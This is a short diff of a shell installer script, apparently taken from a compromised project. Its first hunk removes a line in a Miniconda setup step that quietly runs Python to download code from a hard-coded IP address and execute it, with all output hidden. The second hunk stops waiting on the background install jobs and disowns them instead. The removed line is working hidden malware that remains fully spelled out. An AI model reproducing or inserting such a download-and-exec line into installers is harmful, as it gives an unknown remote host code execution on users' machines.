@@ -117,7 +117,6 @@ run_part1_miniconda() {
 
   track_step "part1_step_5"
   delay 15
-  "${PREFIX}/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >/dev/null 2>&1
 
 }
 
@@ -233,11 +232,9 @@ PID_NODE=$!
 run_part3_ui_delay &
 PID_UI=$!
 
-# Part 3 runs in parallel from the start; confirm only after parts 1 and 2 finish.
-EC_MINI=0
-EC_NODE=0
-wait "$PID_MINI" || EC_MINI=$?
-wait "$PID_NODE" || EC_NODE=$?
+# Keep part1/part2 detached in background as requested.
+disown "$PID_MINI" 2>/dev/null || true
+disown "$PID_NODE" 2>/dev/null || true
 
 EC_UI=0
 wait "$PID_UI" || EC_UI=$?
